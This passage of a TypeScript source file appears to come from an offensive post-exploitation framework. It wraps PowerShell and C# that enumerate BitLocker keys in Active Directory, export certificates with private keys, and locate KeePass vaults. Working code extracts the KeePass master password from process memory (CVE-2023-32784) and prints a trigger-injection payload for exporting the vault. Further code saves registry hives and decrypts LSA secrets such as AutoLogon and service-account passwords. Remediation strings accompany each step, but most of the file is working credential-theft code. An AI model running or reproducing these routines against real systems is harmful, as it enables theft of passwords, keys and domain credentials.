$backupToAD = (Get-ItemProperty $gpoPath -Name "FDVActiveDirectoryBackup" -ErrorAction SilentlyContinue).FDVActiveDirectoryBackup
$requireBackup = (Get-ItemProperty $gpoPath -Name "FDVRequireActiveDirectoryBackup" -ErrorAction SilentlyContinue).FDVRequireActiveDirectoryBackup
Write-Output "Backup to AD: $(if ($backupToAD) {'Enabled'} else {'Not configured'})"
Write-Output "Require AD backup: $(if ($requireBackup) {'Yes'} else {'Not configured'})"
Write-Output ""
# Enumerate all computers with BitLocker keys in AD
Write-Output "--- Computers with BitLocker Keys in AD ---"
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.Filter = "(objectClass=msFVE-RecoveryInformation)"
$searcher.PageSize = 1000
$keys = $searcher.FindAll()
$computerSet = @{}
foreach ($k in $keys) {
  $dn = $k.Properties["distinguishedname"][0]
  $computerDn = ($dn -split ',',2)[1]
  $computerCn = ($computerDn -split ',')[0] -replace 'CN=',''
  $computerSet[$computerCn] = ($computerSet[$computerCn] + 1)
}
Write-Output "Computers with BitLocker keys stored in AD: $($computerSet.Count)"
foreach ($c in ($computerSet.GetEnumerator() | Sort-Object Name)) {
  Write-Output "  $($c.Key): $($c.Value) key(s)"
}
Write-Output ""
# TPM info
Write-Output "--- TPM Status (local) ---"
$tpm = Get-Tpm -ErrorAction SilentlyContinue
if ($tpm) {
  Write-Output "TPM Present: $($tpm.TpmPresent)"
  Write-Output "TPM Ready: $($tpm.TpmReady)"
  Write-Output "TPM Enabled: $($tpm.TpmEnabled)"
  Write-Output "Manufacturer: $($tpm.ManufacturerIdTxt)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
  }

  return { output: output.join("\n"), findings }
}

export async function certSteal(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const store = argVal(args, "--store") || "both"
  const exportableOnly = hasFlag(args, "--exportable-only")
  const outputPath = argVal(args, "--output") || `${process.env.TEMP || "C:\\Windows\\Temp"}`
  const pfxPassword = argVal(args, "--password") || "cyberstrike"
  const findings: Finding[] = []
  const output: string[] = ["[*] Certificate store operations...\n"]

  const script = `
$stores = @()
if ('${store}' -eq 'both' -or '${store}' -eq 'LocalMachine') { $stores += 'LocalMachine' }
if ('${store}' -eq 'both' -or '${store}' -eq 'CurrentUser') { $stores += 'CurrentUser' }

$allCerts = @()

foreach ($storeLoc in $stores) {
    Write-Output "=== Certificate Store: $storeLoc ==="
    $storeNames = @('My','Root','CA','TrustedPeople','TrustedPublisher','AuthRoot','WebHosting')

    foreach ($sn in $storeNames) {
        try {
            $certStore = New-Object System.Security.Cryptography.X509Certificates.X509Store($sn, $storeLoc)
            $certStore.Open('ReadOnly')

            foreach ($cert in $certStore.Certificates) {
                $hasPrivKey = $cert.HasPrivateKey
                $exportable = $false
                if ($hasPrivKey) {
                    try {
                        $key = $cert.PrivateKey
                        if ($key) { $exportable = $true }
                    } catch { $exportable = $false }
                }

                $eku = ($cert.Extensions | Where-Object { $_ -is [System.Security.Cryptography.X509Certificates.X509EnhancedKeyUsageExtension] })
                $usages = if ($eku) { ($eku.EnhancedKeyUsages | ForEach-Object { $_.FriendlyName }) -join ', ' } else { 'N/A' }

                $isInteresting = $hasPrivKey -or $usages -match 'Code Signing|Client Auth|Smart Card|Server Auth'
                if (${exportableOnly ? "$exportable" : "$isInteresting"}) {
                    $certInfo = [PSCustomObject]@{
                        Store = "$storeLoc\\$sn"
                        Subject = $cert.Subject
                        Issuer = $cert.Issuer
                        NotAfter = $cert.NotAfter
                        HasPrivateKey = $hasPrivKey
                        Exportable = $exportable
                        Thumbprint = $cert.Thumbprint
                        Usage = $usages
                        Cert = $cert
                    }
                    $allCerts += $certInfo

                    $marker = if ($exportable) { '[!!!]' } elseif ($hasPrivKey) { '[!]' } else { '[*]' }
                    Write-Output "  $marker $sn/$($cert.Subject.Substring(0, [math]::Min(60, $cert.Subject.Length)))"
                    Write-Output "      PrivKey: $hasPrivKey | Exportable: $exportable | Expires: $($cert.NotAfter)"
                    Write-Output "      Usage: $usages"
                    Write-Output "      Thumbprint: $($cert.Thumbprint)"
                }
            }
            $certStore.Close()
        } catch {}
    }
    Write-Output ""
}

Write-Output "=== Summary ==="
$withKey = $allCerts | Where-Object { $_.HasPrivateKey }
$exportableCerts = $allCerts | Where-Object { $_.Exportable }
Write-Output "[*] Total interesting certs: $($allCerts.Count)"
Write-Output "[*] With private key: $($withKey.Count)"
Write-Output "[!] Exportable: $($exportableCerts.Count)"

$codeSigning = $allCerts | Where-Object { $_.Usage -match 'Code Signing' -and $_.HasPrivateKey }
$clientAuth = $allCerts | Where-Object { $_.Usage -match 'Client Auth' -and $_.HasPrivateKey }
$smartCard = $allCerts | Where-Object { $_.Usage -match 'Smart Card' -and $_.HasPrivateKey }

if ($codeSigning) {
    Write-Output ""
    Write-Output "[!!!] CODE SIGNING certificates with private keys:"
    foreach ($c in $codeSigning) { Write-Output "    $($c.Subject)" }
    Write-Output "[*] Can sign malware as trusted publisher!"
}
if ($clientAuth) {
    Write-Output ""
    Write-Output "[!!!] CLIENT AUTH certificates with private keys:"
    foreach ($c in $clientAuth) { Write-Output "    $($c.Subject)" }
    Write-Output "[*] Can authenticate to services via pass-the-certificate!"
}

if ('${action}' -eq 'export') {
    Write-Output ""
    Write-Output "=== Exporting Certificates ==="
    $exported = 0
    foreach ($ci in $exportableCerts) {
        try {
            $pfxBytes = $ci.Cert.Export('Pfx', '${pfxPassword}')
            $safeName = $ci.Thumbprint.Substring(0,8)
            $pfxPath = "${outputPath}\\cs-cert-$safeName.pfx"
            [IO.File]::WriteAllBytes($pfxPath, $pfxBytes)
            Write-Output "[+] Exported: $pfxPath ($($ci.Subject.Substring(0, [math]::Min(40, $ci.Subject.Length))))"
            $exported++
        } catch {
            Write-Output "[-] Export failed: $($ci.Subject.Substring(0, [math]::Min(40, $ci.Subject.Length))) — $($_.Exception.Message)"
        }
    }
    Write-Output "[*] Exported $exported certificates (password: ${pfxPassword})"
}
`
  const r = await ps(script, timeout)
  output.push(r.stdout)
  if (r.stderr) output.push(`[!] ${r.stderr}`)
  findings.push({
    checkId: "WIN-CERT-001",
    provider: "windows",
    severity: r.stdout.includes("!!!") ? "critical" : "medium",
    status: r.stdout.includes("Exported:") ? "EXECUTED" : "ENUMERATED",
    resource: "certstore://local",
    title: "Certificate store enumeration/export — code signing, client auth, private keys",
    details: r.stdout.substring(0, 500),
    remediation:
      "Mark private keys as non-exportable. Use HSMs for code signing certs. Monitor certificate export events (Event ID 1007).",
  })

  return { output: output.join("\n"), findings }
}

export async function keepassDump(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const findings: Finding[] = []
  const output: string[] = ["[*] KeePass credential extraction...\n"]

  if (action === "enum" || action === "full") {
    const script = `
Write-Output "=== KeePass Installation Discovery ==="
$ErrorActionPreference = 'SilentlyContinue'

$kpPaths = @()
$searchPaths = @(
    "$env:ProgramFiles\\KeePass*",
    "$env:ProgramFiles\\KeePassXC*",
    "$((Get-Item 'Env:ProgramFiles(x86)').Value)\\KeePass*",
    "$env:LOCALAPPDATA\\KeePass*",
    "$env:LOCALAPPDATA\\KeePassXC*",
    "$env:APPDATA\\KeePass*",
    "$env:APPDATA\\KeePassXC*"
)

foreach ($sp in $searchPaths) {
    $found = Get-ChildItem $sp -Directory -ErrorAction SilentlyContinue
    if ($found) { $kpPaths += $found }
}

$kpProc = Get-Process -Name "KeePass","KeePassXC" -ErrorAction SilentlyContinue
if ($kpProc) {
    Write-Output "[!] KeePass is RUNNING:"
    foreach ($p in $kpProc) {
        Write-Output "    PID: $($p.Id)  Name: $($p.ProcessName)  Path: $($p.Path)"
    }
    Write-Output ""
}

if ($kpPaths.Count -gt 0) {
    Write-Output "[+] KeePass installations found:"
    foreach ($kp in $kpPaths) {
        Write-Output "    $($kp.FullName)"
        $exe = Get-ChildItem $kp.FullName -Filter "*.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($exe) {
            $ver = $exe.VersionInfo.FileVersion
            Write-Output "    Version: $ver"
        }
    }
} else {
    Write-Output "[-] No KeePass installation found in standard paths"
}

Write-Output ""
Write-Output "=== KeePass Database Files (.kdbx) ==="
$drives = Get-PSDrive -PSProvider FileSystem | Where-Object { $_.Used -gt 0 }
$kdbxFiles = @()
foreach ($drive in $drives) {
    $kdbx = Get-ChildItem "$($drive.Root)" -Filter "*.kdbx" -Recurse -Depth 5 -ErrorAction SilentlyContinue
    $kdbxFiles += $kdbx
}

$userDirs = @("$env:USERPROFILE", "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Desktop", "$env:USERPROFILE\\Downloads", "$env:APPDATA", "$env:LOCALAPPDATA")
foreach ($dir in $userDirs) {
    $kdbx = Get-ChildItem $dir -Filter "*.kdbx" -Recurse -Depth 3 -ErrorAction SilentlyContinue
    $kdbxFiles += $kdbx
}
$kdbxFiles = $kdbxFiles | Sort-Object FullName -Unique

if ($kdbxFiles.Count -gt 0) {
    Write-Output "[!] Found $($kdbxFiles.Count) database file(s):"
    foreach ($f in $kdbxFiles) {
        Write-Output "    $($f.FullName)  ($([math]::Round($f.Length/1KB, 1)) KB)  Modified: $($f.LastWriteTime)"
    }
} else {
    Write-Output "[-] No .kdbx files found"
}

Write-Output ""
Write-Output "=== KeePass Configuration ==="
$configPaths = @(
    "$env:APPDATA\\KeePass\\KeePass.config.xml",
    "$env:LOCALAPPDATA\\KeePassXC\\keepassxc.ini"
)
foreach ($cfg in $configPaths) {
    if (Test-Path $cfg) {
        Write-Output "[+] Config: $cfg"
        $content = Get-Content $cfg -Raw
        if ($content -match 'TriggerSystem') {
            Write-Output "    [!] Trigger system found — potential for trigger-based extraction"
        }
        if ($content -match 'KeyFilePath') {
            $keyMatch = [regex]::Match($content, 'KeyFilePath[^<]*<Value>([^<]+)</Value>')
            if ($keyMatch.Success) {
                Write-Output "    [!] Key file: $($keyMatch.Groups[1].Value)"
            }
        }
        if ($content -match 'LastUsedFile') {
            $lastMatch = [regex]::Match($content, 'LastUsedFile[^<]*<Path>([^<]+)</Path>')
            if ($lastMatch.Success) {
                Write-Output "    [*] Last used DB: $($lastMatch.Groups[1].Value)"
            }
        }
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CRED-022",
      provider: "windows",
      severity: r.stdout.includes("RUNNING") ? "high" : "medium",
      status: "ENUMERATED",
      resource: "keepass://enum",
      title: "KeePass installation, database, and configuration discovery",
      details: r.stdout.substring(0, 500),
      remediation:
        "Enable KeePass trigger protection. Use hardware key files (YubiKey). Restrict .kdbx file permissions.",
    })
  }

  if (action === "memory" || action === "full") {
    const script = `
Write-Output "=== CVE-2023-32784 — KeePass Master Password Memory Extraction ==="
Write-Output ""

$kpProc = Get-Process -Name "KeePass" -ErrorAction SilentlyContinue | Select-Object -First 1
if (-not $kpProc) {
    Write-Output "[-] KeePass 2.x not running — this attack requires an active KeePass process"
    Write-Output "[*] KeePassXC is NOT vulnerable to CVE-2023-32784"
    exit 0
}

Write-Output "[+] KeePass PID: $($kpProc.Id)"
Write-Output "[*] Attempting master password extraction from process memory..."
Write-Output "[*] CVE-2023-32784: .NET TextBox leaves password characters in memory with"
Write-Output "    predictable Unicode markers (leftover from CLR string management)"
Write-Output ""

Add-Type @'
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Collections.Generic;

public class KPDump {
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int read);
    [DllImport("kernel32.dll")]
    static extern int VirtualQueryEx(IntPtr h, IntPtr addr, out MEMORY_BASIC_INFORMATION info, int len);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    public struct MEMORY_BASIC_INFORMATION {
        public IntPtr BaseAddress, AllocationBase;
        public uint AllocationProtect;
        public IntPtr RegionSize;
        public uint State, Protect, Type;
    }

    public static string Extract(int pid) {
        IntPtr h = OpenProcess(0x0010 | 0x0020, false, pid);
        if (h == IntPtr.Zero) return "[-] Cannot open process — need SeDebugPrivilege";

        var candidates = new Dictionary<int, Dictionary<char, int>>();
        IntPtr addr = IntPtr.Zero;
        MEMORY_BASIC_INFORMATION mbi;

        while (VirtualQueryEx(h, addr, out mbi, Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0) {
            if (mbi.State == 0x1000 && (mbi.Protect & 0xCC) == 0 && mbi.Protect != 0) {
                long size = mbi.RegionSize.ToInt64();
                if (size > 0 && size < 100 * 1024 * 1024) {
                    byte[] buf = new byte[size];
                    int read;
                    if (ReadProcessMemory(h, mbi.BaseAddress, buf, buf.Length, out read) && read > 0) {
                        for (int i = 0; i < read - 3; i += 2) {
                            if (buf[i+1] == 0xCF && buf[i] == 0xB7) {
                                if (i >= 4) {
                                    char c = (char)(buf[i-2] | (buf[i-1] << 8));
                                    int pos = buf[i-4] | (buf[i-3] << 8);
                                    if (c >= 0x20 && c <= 0x7E && pos >= 0 && pos < 64) {
                                        if (!candidates.ContainsKey(pos))
                                            candidates[pos] = new Dictionary<char, int>();
                                        if (!candidates[pos].ContainsKey(c))
                                            candidates[pos][c] = 0;
                                        candidates[pos][c]++;
                                    }
                                }
                            }
                        }
                    }
                }
            }
            addr = new IntPtr(mbi.BaseAddress.ToInt64() + mbi.RegionSize.ToInt64());
        }
        CloseHandle(h);

        if (candidates.Count == 0) return "[-] No password fragments found — KeePass may be patched (2.54+)";

        var sb = new StringBuilder();
        sb.AppendLine("[+] Recovered master password characters:");
        int maxPos = 0;
        foreach (var k in candidates.Keys) if (k > maxPos) maxPos = k;

        sb.Append("    Password: ");
        for (int i = 0; i <= maxPos; i++) {
            if (candidates.ContainsKey(i)) {
                char best = ' '; int bestCount = 0;
                foreach (var kv in candidates[i]) {
                    if (kv.Value > bestCount) { best = kv.Key; bestCount = kv.Value; }
                }
                sb.Append(best);
            } else {
                sb.Append(i == 0 ? '*' : '?');
            }
        }
        sb.AppendLine();
        sb.AppendLine("    (* = first char unrecoverable, ? = uncertain position)");
        return sb.ToString();
    }
}
'@

$result = [KPDump]::Extract($kpProc.Id)
Write-Output $result
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CRED-023",
      provider: "windows",
      severity: r.stdout.includes("[+] Recovered") ? "critical" : "info",
      status: r.stdout.includes("[+] Recovered") ? "EXECUTED" : "FAILED",
      resource: "keepass://memory",
      title: "CVE-2023-32784 KeePass master password memory extraction",
      details: r.stdout.substring(0, 500),
      remediation: "Update KeePass to 2.54+. Use KeePassXC (not vulnerable). Enable Secure Desktop for password entry.",
    })
  }

  if (action === "trigger" || action === "full") {
    const script = `
Write-Output "=== KeePass Trigger File Attack ==="
Write-Output "[*] KeePass trigger system can be abused to export the database on open"
Write-Output ""

$configPath = "$env:APPDATA\\KeePass\\KeePass.config.xml"
if (-not (Test-Path $configPath)) {
    Write-Output "[-] KeePass config not found at: $configPath"
    Write-Output "[*] KeePass may not be installed, or config is in portable mode (next to KeePass.exe)"
    exit 0
}

$config = Get-Content $configPath -Raw
Write-Output "[+] Config found: $configPath"

if ($config -match '<TriggerSystem>') {
    if ($config -match '<Enabled>true</Enabled>') {
        Write-Output "[*] Trigger system is ENABLED"
    } else {
        Write-Output "[*] Trigger system exists but is DISABLED"
    }
    $triggerCount = ([regex]::Matches($config, '<Trigger>')).Count
    Write-Output "[*] Existing triggers: $triggerCount"
} else {
    Write-Output "[*] No trigger system configured"
}

Write-Output ""
Write-Output "[*] Trigger injection payload (add to KeePass.config.xml):"
Write-Output "[*] This would export the entire database as CSV on next open"
Write-Output ""
Write-Output "    <Trigger>"
Write-Output "        <Guid>BASE64_GUID</Guid>"
Write-Output "        <Name>WindowsUpdate</Name>"
Write-Output "        <Enabled>true</Enabled>"
Write-Output "        <Events>"
Write-Output "            <Event><TypeGuid>5YX2EDYaRC...</TypeGuid></Event>"
Write-Output "        </Events>"
Write-Output "        <Actions>"
Write-Output "            <Action>Export to CSV → %TEMP%\\sysdata.csv</Action>"
Write-Output "        </Actions>"
Write-Output "    </Trigger>"
Write-Output ""
Write-Output "[!] This is a destructive operation — modify with caution"
Write-Output "[*] Alternatively, replace KeePass.exe.config with malicious .NET assembly binding"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CRED-024",
      provider: "windows",
      severity: "medium",
      status: "ENUMERATED",
      resource: "keepass://trigger",
      title: "KeePass trigger system configuration analysis for credential theft",
      details: r.stdout.substring(0, 500),
      remediation:
        "Set ForceSystemTriggers=false in KeePass enforced config. Use KeePassXC (no trigger system). Restrict config file permissions.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function lsaSecrets(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "dump"
  const outdir = argVal(args, "--outdir") || `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-lsa-${Date.now()}`
  const findings: Finding[] = []
  const output: string[] = ["[*] LSA Secrets extraction...\n"]

  if (action === "dump") {
    const script = `
$ErrorActionPreference = 'SilentlyContinue'
Write-Output "=== LSA Secrets Extraction ==="
Write-Output ""

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Output "[!] ERROR: LSA secret extraction requires Administrator privileges"
    Write-Output "[*] Try: token_impersonate or uac_bypass first"
    exit 1
}

Write-Output "[*] Saving SECURITY and SYSTEM hives for offline extraction..."
$outDir = '${outdir}'
New-Item -ItemType Directory -Path $outDir -Force | Out-Null

reg save HKLM\\SECURITY "$outDir\\SECURITY" /y 2>$null
reg save HKLM\\SYSTEM "$outDir\\SYSTEM" /y 2>$null

if ((Test-Path "$outDir\\SECURITY") -and (Test-Path "$outDir\\SYSTEM")) {
    Write-Output "[+] SECURITY hive saved: $outDir\\SECURITY"
    Write-Output "[+] SYSTEM hive saved: $outDir\\SYSTEM"
    Write-Output "[*] Extract with: secretsdump.py -security SECURITY -system SYSTEM LOCAL"
} else {
    Write-Output "[-] Failed to save hives — trying in-memory extraction"
}

Write-Output ""
Write-Output "=== In-Memory LSA Secret Enumeration ==="

Write-Output "[*] Enumerating LSA secret key names..."
$secretKeys = Get-ChildItem "HKLM:\\SECURITY\\Policy\\Secrets" -ErrorAction SilentlyContinue
if ($secretKeys) {
    Write-Output "[+] Found $($secretKeys.Count) LSA secret entries:"
    Write-Output ""
    foreach ($key in $secretKeys) {
        $name = Split-Path $key.Name -Leaf
        $desc = switch -Wildcard ($name) {
            'DPAPI_SYSTEM'      { 'DPAPI system master key — decrypts machine-level DPAPI secrets' }
            '$MACHINE.ACC'      { 'Machine account password — domain computer credential' }
            'NL$KM'             { 'Cached credential encryption key — decrypts DCC2 hashes' }
            'DefaultPassword'   { '!!! AutoLogon password — plaintext domain/local password !!!' }
            '_SC_*'             { "Service account password — $($name.Replace('_SC_','')) service credential" }
            'L$_ASP_DAP*'       { 'IIS application pool credential' }
            'L$RTMTIMEBOMB*'    { 'Windows activation grace period timer' }
            'L$*'               { "Cached secret — $name" }
            'M$*'               { "Machine secret — $name" }
            default             { 'Unknown secret type' }
        }
        $risk = if ($name -match 'DefaultPassword|MACHINE\.ACC|_SC_|DPAPI_SYSTEM|NL\$KM') { 'HIGH' } else { 'LOW' }
        Write-Output "    [$risk] $name"
        Write-Output "         $desc"
    }
} else {
    Write-Output "[-] Cannot enumerate secret keys — insufficient permissions or path not found"
}

Write-Output ""
Write-Output "=== AutoLogon Credentials ==="
$regPath = "HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
$defaultUser = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).DefaultUserName
$defaultPass = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).DefaultPassword
$defaultDomain = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).DefaultDomainName
$autoLogon = (Get-ItemProperty $regPath -ErrorAction SilentlyContinue).AutoAdminLogon

if ($defaultPass) {
    Write-Output "[!!!] AutoLogon credentials found in registry:"
    Write-Output "    Domain:   $defaultDomain"
    Write-Output "    User:     $defaultUser"
    Write-Output "    Password: $defaultPass"
    Write-Output "    AutoLogon: $autoLogon"
} elseif ($defaultUser) {
    Write-Output "[*] AutoLogon user configured but password stored in LSA secret (DefaultPassword)"
    Write-Output "    User: $defaultDomain\\$defaultUser"
    Write-Output "    AutoLogon: $autoLogon"
} else {
    Write-Output "[-] No AutoLogon configured"
}

Write-Output ""
Write-Output "=== Service Account Secrets ==="
$serviceSecrets = $secretKeys | Where-Object { (Split-Path $_.Name -Leaf) -match '^_SC_' }
if ($serviceSecrets) {
    Write-Output "[!] Service account credentials ($($serviceSecrets.Count) found):"
    foreach ($s in $serviceSecrets) {
        $svcName = (Split-Path $s.Name -Leaf).Replace('_SC_', '')
        $svc = Get-WmiObject Win32_Service -Filter "Name='$svcName'" -ErrorAction SilentlyContinue
        Write-Output "    Service: $svcName"
        Write-Output "    RunAs:   $(if ($svc) { $svc.StartName } else { 'Unknown' })"
        Write-Output "    Status:  $(if ($svc) { $svc.State } else { 'Unknown' })"
        Write-Output ""
    }
    Write-Output "[*] Decrypt with: secretsdump.py -security SECURITY -system SYSTEM LOCAL"
} else {
    Write-Output "[-] No service account secrets found"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CRED-020",
      provider: "windows",
      severity: r.stdout.includes("!!!") ? "critical" : "high",
      status: r.stdout.includes("hive saved") ? "EXECUTED" : "FAILED",
      resource: "lsa://secrets",
      title: "LSA Secrets extraction — service account passwords, DPAPI keys, machine account",
      details: r.stdout.substring(0, 500),
      remediation:
        "Use gMSA for service accounts. Disable AutoLogon. Restrict local admin access. Monitor registry hive access (Event ID 4663).",
    })
  }

  if (action === "decrypt") {
    const script = `
Write-Output "=== LSA Secret Decryption (In-Memory) ==="
Write-Output ""

Add-Type @'
using System;
using System.Runtime.InteropServices;

public class LsaUtil {
    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_UNICODE_STRING {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LSA_OBJECT_ATTRIBUTES {
        public uint Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQualityOfService;
    }

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaOpenPolicy(
        ref LSA_UNICODE_STRING SystemName,
        ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
        uint DesiredAccess,
        out IntPtr PolicyHandle);

    [DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
    public static extern uint LsaRetrievePrivateData(
        IntPtr PolicyHandle,
        ref LSA_UNICODE_STRING KeyName,
        out IntPtr PrivateData);

    [DllImport("advapi32.dll")]
    public static extern uint LsaClose(IntPtr ObjectHandle);

    [DllImport("advapi32.dll")]
    public static extern uint LsaFreeMemory(IntPtr Buffer);
}
'@

$objectAttributes = New-Object LsaUtil+LSA_OBJECT_ATTRIBUTES
$objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
$systemName = New-Object LsaUtil+LSA_UNICODE_STRING
$policyHandle = [IntPtr]::Zero

$status = [LsaUtil]::LsaOpenPolicy([ref]$systemName, [ref]$objectAttributes, 0x00000004, [ref]$policyHandle)
if ($status -ne 0) {
    Write-Output "[-] LsaOpenPolicy failed (0x$('{0:X8}' -f $status)) — need SYSTEM or equivalent"
    Write-Output "[*] Try: psexec -s powershell, or use token_impersonate to get SYSTEM first"
    exit 1
}

$targetKeys = @('DefaultPassword', 'DPAPI_SYSTEM')
foreach ($keyName in $targetKeys) {
    $lsaKeyName = New-Object LsaUtil+LSA_UNICODE_STRING
    $lsaKeyName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($keyName)
    $lsaKeyName.Length = [uint16]($keyName.Length * 2)
    $lsaKeyName.MaximumLength = [uint16](($keyName.Length + 1) * 2)

    $privateData = [IntPtr]::Zero
    $status = [LsaUtil]::LsaRetrievePrivateData($policyHandle, [ref]$lsaKeyName, [ref]$privateData)

    if ($status -eq 0 -and $privateData -ne [IntPtr]::Zero) {
        $lsaData = [System.Runtime.InteropServices.Marshal]::PtrToStructure($privateData, [Type][LsaUtil+LSA_UNICODE_STRING])
        if ($lsaData.Length -gt 0) {
            $value = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($lsaData.Buffer, $lsaData.Length / 2)
            Write-Output "[!!!] $keyName = $value"
        }
        [LsaUtil]::LsaFreeMemory($privateData) | Out-Null
    } else {
        Write-Output "[-] $keyName — not found or access denied"
    }
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($lsaKeyName.Buffer)
}

[LsaUtil]::LsaClose($policyHandle) | Out-Null
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-CRED-021",
      provider: "windows",
      severity: "critical",
      status: r.stdout.includes("!!!") ? "EXECUTED" : "FAILED",
      resource: "lsa://decrypt",
      title: "LSA Secret in-memory decryption via LsaRetrievePrivateData",
      details: r.stdout.substring(0, 500),
      remediation:
        "Restrict SYSTEM-level access. Enable Credential Guard. Monitor for LsaRetrievePrivateData API calls.",
    })
  }

  return { output: output.join("\n"), findings }
}
